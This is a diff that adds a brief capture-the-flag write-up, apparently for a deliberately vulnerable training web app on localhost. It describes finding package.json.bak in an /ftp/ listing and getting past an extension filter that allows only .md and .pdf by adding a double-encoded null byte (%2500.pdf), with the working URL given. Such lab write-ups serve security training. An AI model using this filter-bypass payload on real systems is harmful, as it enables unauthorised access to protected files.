@@ -1,0 +1,11 @@
+Revisiting the url : http://localhost:3000/ftp/
+we see an interesting file : http://localhost:3000/ftp/package.json.bak
+
+upon trying to access it we are shown an 403 Error: Only .md and .pdf files are allowed!
+
+this can be bypassed by null byte injection (%00)
+
+http://localhost:3000/ftp/package.json.bak%2500.pdf
+(%2500) %25 to encode %,
+
+doing so successfully solved the challenge
